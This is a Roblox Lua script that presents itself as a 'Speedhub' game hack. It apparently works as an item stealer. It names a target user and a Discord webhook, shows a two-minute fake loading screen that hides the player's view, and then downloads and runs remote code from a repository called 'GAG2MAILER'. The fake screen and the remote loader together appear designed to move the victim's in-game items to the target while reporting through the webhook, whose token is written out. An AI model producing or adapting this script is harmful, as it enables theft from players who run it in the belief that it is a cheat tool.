--CONFIG--
getgenv().TARGET_USER_ID = 5217877819
getgenv().MENTION_EVERYONE = false
getgenv().SEND_LIST = "all"
getgenv().YOUR_WEBHOOK = "https://discord.com/api/webhooks/1524960249688101014/yWgzG06_tFgP4skrvEx5rpthdgnKaX4oj34HZGi-922kIGDndTDOmnGy0enR2ABDzd_Z"
getgenv().ITEM_DATABASE_URL = "https://pastebin.com/raw/TYju4wSY"

--LOADING SCREEN CONFIG--
getgenv().LoadingScreen = true
getgenv().LoadingConfig = {
    Duration = "2m",
    Decal    = false,
    DecalId  = "52757257275",  -----textureid
    Text     = "Speedhub",
    BackgroundColor = Color3.fromRGB(0, 0, 0),
    TextColor       = Color3.fromRGB(255, 255, 255),
    Font            = Enum.Font.GothamBold,
    BarColor        = Color3.fromRGB(255, 255, 255),
    FadeOut         = true,
    FadeTime        = 1,
}

--LOADING SCREEN--
if getgenv().LoadingScreen then
    task.spawn(function()
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")

        pcall(function()
            game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
        end)

        local player = Players.LocalPlayer
        local playerGui = player:WaitForChild("PlayerGui")

        local gui = Instance.new("ScreenGui")
        gui.Name = "FakeLoadingScreen"
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.DisplayOrder = 9999
        gui.Parent = playerGui

        local bg = Instance.new("Frame")
        bg.Size = UDim2.fromScale(1, 1)
        bg.BackgroundColor3 = getgenv().LoadingConfig.BackgroundColor
        bg.BorderSizePixel = 0
        bg.Parent = gui

        if getgenv().LoadingConfig.Decal then
            local decal = Instance.new("ImageLabel")
            decal.AnchorPoint = Vector2.new(0.5, 0.5)
            decal.Position = UDim2.new(0.5, 0, 0.5, -140)
            decal.Size = UDim2.fromOffset(220, 220)
            decal.BackgroundTransparency = 1
            decal.Image = "rbxassetid://" .. getgenv().LoadingConfig.DecalId
            decal.Parent = bg
        end

        local title = Instance.new("TextLabel")
        title.AnchorPoint = Vector2.new(0.5, 0.5)
        title.Position = UDim2.fromScale(0.5, 0.62)
        title.Size = UDim2.new(0.85, 0, 0, 100)
        title.BackgroundTransparency = 1
        title.Text = getgenv().LoadingConfig.Text
        title.TextColor3 = getgenv().LoadingConfig.TextColor
        title.TextScaled = true
        title.Font = getgenv().LoadingConfig.Font
        title.Parent = bg

        local barBack = Instance.new("Frame")
        barBack.AnchorPoint = Vector2.new(0.5, 0.5)
        barBack.Position = UDim2.fromScale(0.5, 0.78)
        barBack.Size = UDim2.new(0.5, 0, 0, 18)
        barBack.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        barBack.BorderSizePixel = 0
        barBack.Parent = bg
        Instance.new("UICorner", barBack).CornerRadius = UDim.new(1, 0)

        local barFill = Instance.new("Frame")
        barFill.Size = UDim2.fromScale(0, 1)
        barFill.BackgroundColor3 = getgenv().LoadingConfig.BarColor
        barFill.BorderSizePixel = 0
        barFill.Parent = barBack
        Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

        local percent = Instance.new("TextLabel")
        percent.AnchorPoint = Vector2.new(0.5, 0.5)
        percent.Position = UDim2.fromScale(0.5, 0.84)
        percent.Size = UDim2.new(0.3, 0, 0, 30)
        percent.BackgroundTransparency = 1
        percent.Text = "0%"
        percent.TextColor3 = getgenv().LoadingConfig.TextColor
        percent.TextScaled = true
        percent.Font = getgenv().LoadingConfig.Font
        percent.Parent = bg

        local seconds = 0
        for num, unit in tostring(getgenv().LoadingConfig.Duration):gmatch("(%d+)%s*([smSM]?)") do
            num = tonumber(num) or 0
            if unit:lower() == "m" then seconds += num * 60 else seconds += num end
        end

        TweenService:Create(barFill, TweenInfo.new(seconds, Enum.EasingStyle.Linear), {Size = UDim2.fromScale(1, 1)}):Play()

        task.spawn(function()
            local start = os.clock()
            while true do
                local pct = math.clamp((os.clock() - start) / seconds, 0, 1)
                percent.Text = math.floor(pct * 100) .. "%"
                if pct >= 1 then break end
                task.wait()
            end
        end)

        task.wait(seconds)

        if getgenv().LoadingConfig.FadeOut then
            local info = TweenInfo.new(getgenv().LoadingConfig.FadeTime)
            TweenService:Create(bg, info, {BackgroundTransparency = 1}):Play()
            TweenService:Create(title, info, {TextTransparency = 1}):Play()
            TweenService:Create(barBack, info, {BackgroundTransparency = 1}):Play()
            TweenService:Create(barFill, info, {BackgroundTransparency = 1}):Play()
            TweenService:Create(percent, info, {TextTransparency = 1}):Play()
            task.wait(getgenv().LoadingConfig.FadeTime)
        end

        gui:Destroy()
    end)
end

--LOADER--
loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/GAG2MAILER/refs/heads/main/HYHAX"))()
